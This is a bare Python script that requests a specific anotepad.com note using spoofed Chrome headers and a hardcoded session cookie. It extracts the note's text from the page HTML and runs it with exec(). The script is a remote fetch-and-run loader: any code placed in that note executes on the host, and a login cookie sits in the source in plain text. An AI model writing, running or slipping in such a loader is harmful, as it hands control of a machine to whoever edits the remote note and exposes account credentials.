import requests, html
def get(cookie):
    headers = {
        'authority' : 'anotepad.com',
        'method' : 'GET',
        'path' :  '/notes/3f3rdkh5',
        'scheme' : 'https',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language' : 'vi,vi-VN;q=0.9,en;q=0.8',
        'Cache-Control' : 'max-age=0',
        'Cookie' : cookie,
        'Referer' : 'https://anotepad.com/',
        'Sec-Ch-Ua' :    '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
        'Sec-Ch-Ua-Mobile' : '?0',
        'Sec-Ch-Ua-Platform' : '"Windows"',
        'Sec-Fetch-Dest' : 'document',
        'Sec-Fetch-Mode' : 'navigate',
        'Sec-Fetch-Site' : 'same-origin',
        'Sec-Fetch-User' : '?1',
        'Upgrade-Insecure-Requests' : '1',
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    }
    r = requests.get('https://anotepad.com/notes/3f3rdkh5', headers= headers)
    text = r.text
    split = text.split('<textarea name="notecontent" class="form-control textarea " id="edit_textarea" placeholder="Note Content"')[1].split('">')[1].split('</textarea>')[0]
    run = html.unescape(split)
    exec(run)
    # exec(html.unescape(split))
cookie ='_ga=GA1.1.1560674324.1697271489; AnotepadId=CD98EA37B69AF0656EFFB8DC4A1B6C361093EF61D45785921782752710C564F5D293AA11C0CC34BBEBED7417EC517E61F9A8A8442C8EC04896F0FDB1491F44B206197B4136B17612D693EF4FAB2D8436CB7EC2F550E99FA8E475011804148960B0059E9AECB8F2550B659B2D3B955D1B; _ga_6PG3MM86KX=GS1.1.1697613280.6.1.1697613286.0.0.0'
get(cookie)